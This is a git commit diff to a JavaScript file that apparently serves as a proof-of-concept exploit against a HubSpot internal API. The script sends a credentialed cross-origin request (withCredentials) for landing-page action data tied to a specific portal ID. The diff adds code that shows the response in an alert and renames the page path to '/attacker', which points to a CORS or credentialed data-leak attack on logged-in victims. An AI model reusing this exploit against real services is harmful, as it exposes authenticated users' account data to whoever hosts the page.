0d8e39779c6eb9856e0a634868afaac9384e3588
Mohamed Mahmoudi <41636967+medmahmoudi26@users.noreply.github.com>
2022-02-03 01:31:23 +0100

    Update test.js

--- assets/javascript/test.js
+++ assets/javascript/test.js
@@ -1,5 +1,11 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https:\/\/app-eu1.hubspot.com\/content-tools-menu\/api\/v1\/tools-menu\/landing-pages\/45913845747\/actions?portalId=25502480&callback=jsonpHandler", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        alert(xhr.responseText);
+    }
+}
+
+xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler", true);
 xhr.setRequestHeader("accept", "*\/*");
 xhr.setRequestHeader("accept-language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
 xhr.withCredentials = true;
@@ -7,5 +13,5 @@ var body = "";
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
 	aBody[i] = body.charCodeAt(i);
-window.history.replaceState(null, '', '/test');
+window.history.replaceState(null, '', '/attacker');
 xhr.send(new Blob([aBody]));
